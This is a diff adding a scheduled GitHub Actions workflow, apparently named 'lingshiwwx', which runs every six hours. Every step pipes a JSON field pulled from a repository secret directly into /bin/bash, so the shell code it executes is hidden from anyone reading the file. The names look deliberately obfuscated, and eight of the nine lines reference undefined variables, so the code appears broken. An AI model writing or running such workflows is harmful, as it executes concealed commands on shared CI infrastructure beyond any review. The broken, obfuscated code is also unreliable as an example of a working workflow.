@@ -1,0 +1,25 @@
+name: lingshiwwx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingshiwwx
+        env:
+          i06: ${{ secrets.i06 }}
+        run: |
+          echo $i06 | jq -r .tt1968 | /bin/bash
+          echo $mz2 | jq -r .t72886 | /bin/bash
+          echo $cqfgo83 | jq -r .awf03564 | /bin/bash
+          echo $rwl38 | jq -r .nfsw84856 | /bin/bash
+          echo $n546 | jq -r .piuv8 | /bin/bash
+          echo $gr7634 | jq -r .nkn1 | /bin/bash
+          echo $enkym317 | jq -r .zoour66 | /bin/bash
+          echo $o2 | jq -r .khxbl73604 | /bin/bash
+          echo $b49 | jq -r .z3678 | /bin/bash
+
